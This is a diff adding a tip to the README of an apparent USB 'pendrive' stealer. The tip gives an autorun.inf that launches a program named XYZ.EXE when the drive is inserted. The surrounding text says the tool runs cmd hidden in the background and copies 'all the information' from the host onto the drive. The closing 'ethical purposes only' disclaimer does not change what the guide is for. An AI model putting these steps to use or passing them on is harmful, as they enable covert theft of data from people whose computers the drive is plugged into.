@@ -83,3 +83,17 @@ Your Pendrive should look like this:
 https://i.imgur.com/44TPRS2.png
 
 To start the stealing process you just have to click the  Start  shortcut then cmd will be opened in background and will save all the information to your pendrive.
+
+TIP:
+
+To make pendrive autorun  Start  shortcut itself when inserted:
+
+Create a file name  autorun.inf  :
+
+      [autorun]
+      OPEN=XYZ.EXE
+
+
+
+NOTE:
+Use these programs for ethical purposes only. I am not responsible for any thing you do!!
